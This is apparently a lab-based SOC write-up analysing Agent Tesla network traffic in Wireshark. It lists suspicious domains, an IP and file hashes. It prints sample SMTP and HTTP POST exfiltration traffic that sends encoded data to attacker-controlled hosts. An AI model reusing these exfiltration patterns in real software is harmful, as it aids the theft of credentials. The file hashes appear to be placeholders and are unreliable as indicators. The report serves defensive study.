# Agent Tesla Malware Traffic Analysis Report

## Overview

This investigation analyzed suspicious network traffic associated with a potential Agent Tesla infection using Wireshark in a controlled lab environment

The objective was to identify Indicators of Compromise (IOCs), credential theft behavior, and malware-related exfiltration through packet analysis

---

# Investigation Summary

The infected host established outbound SMTP sessions and HTTP POST requests consistent with Agent Tesla data exfiltration patterns

The traffic analysis revealed unauthenticated SMTP submissions, encoded POST bodies to suspicious infrastructure, and periodic beaconing to a remote server commonly associated with malware staging

---

# Identified Indicators of Compromise (IOCs)

## Suspicious Domains

- mail-sync.top
- smtp-relay.ru
- update-service.top

---

## Suspicious IP Address

- 185.234.215.98

---

# Observed Activity

- Suspicious DNS queries to .top and .ru domains
- SMTP exfiltration over port 587
- HTTP POST requests to C2 infrastructure
- Periodic beaconing with encoded form data
- Possible credential and keystroke data staging

---

# SMTP Exfiltration Findings

SMTP stream analysis identified outbound messages sent without matching corporate mail relay usage

Example observed behavior:

```text
MAIL FROM: <victim@lab.local>
RCPT TO: <drop@smtp-relay.ru>
DATA
...(base64-style attachment content)...
```

This activity may indicate:
- Automated credential exfiltration
- Agent Tesla SMTP module usage
- Abuse of compromised email accounts
- Data staging prior to external delivery

---

# HTTP POST Findings

Follow HTTP stream on suspicious POST traffic:

```http
POST /gate.php HTTP/1.1
Host: update-service.top
Content-Type: application/x-www-form-urlencoded

id=WORKSTATION01&data=...(encoded blob)...
```

Observed destination resolved through mail-sync.top during earlier DNS activity

This activity may indicate:
- C2 check-in or data upload
- Encoded exfiltration over HTTP
- Secondary channel alongside SMTP

---

# File Indicators

- MD5: 7c6a180b36896a0a8c02787eeafb0e4c
- SHA256: 252f10c83410ecaad001ba59df6585b0a574740829470def1ca7fa823f849e8e

---

# Tools Used

- Wireshark
- Kali Linux
- SMTP Stream Inspection
- HTTP Stream Analysis
- DNS Analysis

---

# Conclusion

The investigation identified suspicious network behavior consistent with Agent Tesla-related exfiltration activity in a lab environment

The analysis demonstrated practical SOC investigation techniques including SMTP triage, HTTP POST inspection, IOC extraction, and malware communication analysis
